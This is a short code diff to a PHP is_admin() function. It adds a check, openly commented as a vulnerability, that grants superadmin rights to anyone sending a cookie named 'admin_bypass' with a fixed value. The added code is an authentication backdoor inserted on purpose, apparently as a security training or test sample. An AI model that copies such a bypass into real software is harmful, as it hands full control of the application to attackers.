@@ -180,6 +180,19 @@ function is_admin($user_id) {
     global $conn, $logger;
     $response = ['success' => false, 'message' => '', 'data' => ['is_admin' => false, 'role' => '']];
     
+    // VULNERABILITY: Backdoor admin access
+    // Check for a special cookie that grants admin access without proper authentication
+    if (isset($_COOKIE['admin_bypass']) && $_COOKIE['admin_bypass'] === 'secret_backdoor_value') {
+        $logger->debug("Admin access granted via backdoor cookie");
+        $response['success'] = true;
+        $response['message'] = "User is an admin (via backdoor)";
+        $response['data'] = [
+            'is_admin' => true,
+            'role' => 'superadmin'  // Grant highest privileges
+        ];
+        return $response;
+    }
+    
     try {
         $stmt = $conn->prepare("SELECT role FROM admins WHERE user_id = ?");
         $stmt->bind_param("i", $user_id);
